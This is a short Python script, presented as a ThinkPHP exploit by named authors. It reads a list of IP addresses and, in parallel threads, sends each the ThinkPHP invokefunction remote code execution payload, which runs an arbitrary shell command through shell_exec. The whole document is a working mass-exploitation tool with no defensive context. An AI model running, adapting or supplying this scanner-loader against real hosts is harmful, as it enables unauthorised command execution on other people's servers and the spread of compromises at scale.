#!/usr/bin/python
# ThinkPHP exploit by prism131 and Entity

import threading, sys, time, random, socket, subprocess, re, os, struct, array, requests
from threading import Thread
from time import sleep
import requests
from requests.auth import HTTPDigestAuth
from decimal import *
ips = open(sys.argv[1], "r").readlines()
cmd = "SHELL_COMMAND"
payload = "public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]="+cmd+""

class load(threading.Thread):
  def __init__ (self, ip):
    threading.Thread.__init__(self)
    self.ip = str(ip).rstrip('\n')
  def run(self):
    try:
      url = "http://" + self.ip + "/" + payload
      requests.get(url, timeout=5)
      print("[ThinkPHP] Loading - " + self.ip)
    except Exception as e:
      pass

for ip in ips:
  try:
    n = load(ip)
    n.start()
  except:
    pass
